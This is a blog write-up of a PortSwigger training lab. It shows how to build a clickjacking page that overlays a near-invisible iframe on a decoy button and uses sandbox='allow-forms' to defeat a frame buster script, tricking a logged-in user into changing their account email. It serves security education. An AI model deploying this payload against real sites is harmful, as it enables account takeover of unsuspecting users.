---
layout: single
title: "Portswigger’s lab write up: Clickjacking with a frame buster script"
date: 2022-11-19 03:40:24
categories: webdev, portswigger, clickjacking, writeup
---

![Portswigger’s lab write up: Clickjacking with a frame buster script]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-clickjacking-with-a-frame-buster-script-00.png)
------------
In this apprentice level lab, we will exploit the change email flow from a website vulnerable to clickjacking via URL parameters, even though there is a frame buster script enabled.

* * * * *

Upon logging in with the given credentials, we notice that after going to the account page, all that is needed to change a user's email is click on the `Update Email` button and that the email can be prefilled via URL parameters. Let's use the writing material's clickjacking template to craft our exploit:

```
<head>
	<style>
		iframe {
			 position:relative;
			 width:700px;
			 height:600px;
			 opacity:0.1;
			 z-index:2;
			}
		div {
			 position:absolute;
			 z-index:1;
			}
	</style>
</head>
<body>
	<div>
		CLICK HERE
	</div>
	<iframe src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
	</iframe>
</body>

```

This is how the template looks on our exploit server:

![]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-clickjacking-with-a-frame-buster-script-01.png)

We can read the message `This page cannot be framed`; this happens because the website enabled a frame buster script, so we cannot render an iframe on this site. A workaround we can try is to add the `sandbox` attribute to our exploit's iframe and set it to `allow-forms`; this will skip the frame buster script and render the iframe. This is how the exploit looks now:

![]({{ site.url }}{{ site.baseurl }}/assets/img/portswigger’s-lab-write-up:-clickjacking-with-a-frame-buster-script-02.png)

We need to modify the location of the `CLICK ME` div tag so that it is on top of the `Update Email` button on the vulnerable website. Note that we are setting the iframe's opacity to `0.1` to be able to check the exploit appearance and then modifying the div's top and left CSS properties so that when a logged in user clicks on the `CLICK ME` div on our website, they are actually clicking on the vulnerable website's button to update their email to whatever we previously set in the URL parameters. After setting the top property to 450px and the left property to 50px, it looks like the buttons are aligned to perform a successful attack. At this point, our exploit looks like this:

```
<head>
	<style>
		iframe {
			 position:relative;
			 width:700px;
			 height:600px;
			 opacity:0.1;
			 z-index:2;
			}
		div {
			 position:absolute;
			 z-index:1;
			 top:450px;
			 left:50px;
			}
	</style>
</head>
<body>
	<div>
		CLICK HERE
	</div>
	<iframe 
sandbox="allow-forms" src="${LAB_ACCOUNT_ROUTE_URL}?email=attacker@email.com">
	</iframe>
</body>

```

![](https://res-2.cloudinary.com/hbig9cpoo/image/upload/q_auto/v1/ghost-blog-images/3.png)

All we need to do is set the iframe's opacity to 0.00001 or something similar so that it is almost invisible and send the exploit to our victim.

Check out this write up on the Art Of Code: https://artofcode.tech/portswiggers-lab-write-up-clickjacking-with-a-frame-buster-script/

Github: https://github.com/christianpaez/portswigger/tree/main/labs/apprentice/clickjacking/clickjacking-with-a-frame-buster-script
